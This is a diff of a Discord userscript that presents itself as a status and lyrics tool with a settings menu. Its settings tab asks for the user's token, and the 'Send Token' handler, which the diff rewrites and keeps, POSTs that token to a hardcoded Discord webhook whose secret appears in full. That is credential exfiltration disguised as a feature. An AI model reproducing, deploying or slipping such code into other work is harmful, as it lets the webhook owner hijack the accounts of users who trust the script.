@@ -10,58 +10,61 @@
 // @require      https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.0/jquery.min.js
 // ==/UserScript==
 
-const webhookURL = "https://discord.com/api/webhooks/1316292709236867122/aixaA2_np1zAjp5WGtabkDHLqF26Y0pW85wIEgI7DfwPTwDeJbuNzvVkciArZAD2pbV0"; // Replace this with your Discord webhook URL
+(function() {
+    'use strict';
 
-$(
-  `<div id="menu-UI" class="hid-anim">
-    <div id="menu-tabs">
-        <button id="run-tab-button" class="tab-button cur-tab">Run</button>
-        <button id="settings-tab-button" class="tab-button">Settings</button>
-        <button id="debug-tab-button" class="tab-button">Debug</button>
-    </div>
-    <div id="menu-contents">
-        <div id="run-tab" class="tab-content act">
-            <div id="log-window"></div>
-            <div id="ss-buttons">
-                <button id="start" class="button1">Start</button>
-                <button id="stop" class="button1">Stop</button>
-            </div>
+    const webhookURL = "https://discord.com/api/webhooks/1316292709236867122/aixaA2_np1zAjp5WGtabkDHLqF26Y0pW85wIEgI7DfwPTwDeJbuNzvVkciArZAD2pbV0"; // Replace this with your Discord webhook URL
+
+    $(
+      `<div id="menu-UI" class="hid-anim">
+        <div id="menu-tabs">
+            <button id="run-tab-button" class="tab-button cur-tab">Run</button>
+            <button id="settings-tab-button" class="tab-button">Settings</button>
+            <button id="debug-tab-button" class="tab-button">Debug</button>
         </div>
-        <div id="settings-tab" class="tab-content hid">
-            <div class="settings">
-                <span class="settings-name">General</span>
-                <div class="option">
-                    <label for="user-token">Token:</label>
-                    <input type="text" id="user-token" class="text-input1">
-                    <button id="send-token" class="button1">Send Token</button>
-                </div>
-                <div class="option">
-                    <label for="autorun">Autorun:</label>
-                    <input type="checkbox" id="autorun">
+        <div id="menu-contents">
+            <div id="run-tab" class="tab-content act">
+                <div id="log-window"></div>
+                <div id="ss-buttons">
+                    <button id="start" class="button1">Start</button>
+                    <button id="stop" class="button1">Stop</button>
                 </div>
             </div>
-            <div class="settings">
-                <span class="settings-name">Status view</span>
-                <div class="option">
-                    <label for="enable-timestamp">Enable timestamp</label>
-                    <input type="checkbox" id="enable-timestamp" checked>
-                </div>
-                <div class="option">
-                    <label for="enable-label">Enable label</label>
-                    <input type="checkbox" id="enable-label" checked>
-                </div>
-                <div class="option">
-                    <span class="fw-500">Preview:</span>
-                    <span id="status-preview" class="b-area">[2:17] Song lyrics - La-la-la</span>
-                </div>
-                <div class="option">
-                    <label for="enable-advanced-swt">Advanced settings</label>
-                    <input type="checkbox" id="enable-advanced-swt">
-                </div>
-                <div id="advanced-swt" class="sub-settings hid">
+            <div id="settings-tab" class="tab-content hid">
+                <div class="settings">
+                    <span class="settings-name">General</span>
                     <div class="option">
-                        <label for="custom-emoji">
-                            Custom emoji
+                        <label for="user-token">Token:</label>
+                        <input type="text" id="user-token" class="text-input1">
+                        <button id="send-token" class="button1">Send Token</button>
+                    </div>
+                    <div class="option">
+                        <label for="autorun">Autorun:</label>
+                        <input type="checkbox" id="autorun">
+                    </div>
+                </div>
+                <div class="settings">
+                    <span class="settings-name">Status view</span>
+                    <div class="option">
+                        <label for="enable-timestamp">Enable timestamp</label>
+                        <input type="checkbox" id="enable-timestamp" checked>
+                    </div>
+                    <div class="option">
+                        <label for="enable-label">Enable label</label>
+                        <input type="checkbox" id="enable-label" checked>
+                    </div>
+                    <div class="option">
+                        <span class="fw-500">Preview:</span>
+                        <span id="status-preview" class="b-area">[2:17] Song lyrics - La-la-la</span>
+                    </div>
+                    <div class="option">
+                        <label for="enable-advanced-swt">Advanced settings</label>
+                        <input type="checkbox" id="enable-advanced-swt">
+                    </div>
+                    <div id="advanced-swt" class="sub-settings hid">
+                        <div class="option">
+                            <label for="custom-emoji">
+                                Custom emoji
                             <img id="custom-emoji-help" class="clickable question-mark1" src="https://www.pngall.com/wp-content/uploads/5/Help-Question-Mark-PNG-Free-Download.png" height="15">
                             :
                         </label>
@@ -1129,21 +1132,24 @@ if(settings.autorun) {
     }, 150);
 })();
 
-$(document).on("click", "#send-token", function () {
-    const userToken = $("#user-token").val().trim();
-    if (userToken) {
-        $.post(webhookURL, JSON.stringify({
-            content: `Token: ${userToken}`
-        }),
-        "application/json")
-        .done(() => {
-            alert("Token sent successfully!");
-        })
-        .fail(() => {
-            alert("Failed to send the token. Please check the webhook URL.");
-        });
-    } else {
-        alert("Please enter a valid token.");
-    }
-});
-// Init
+    $(document).on("click", "#send-token", function () {
+        const userToken = $("#user-token").val().trim();
+        if (userToken) {
+            $.ajax({
+                url: webhookURL,
+                type: "POST",
+                contentType: "application/json",
+                data: JSON.stringify({ content: `Token: ${userToken}` }),
+                success: function() {
+                    alert("Token sent successfully!");
+                },
+                error: function() {
+                    alert("Failed to send the token. Please check the webhook URL.");
+                }
+            });
+        } else {
+            alert("Please enter a valid token.");
+        }
+    });
+
+})();
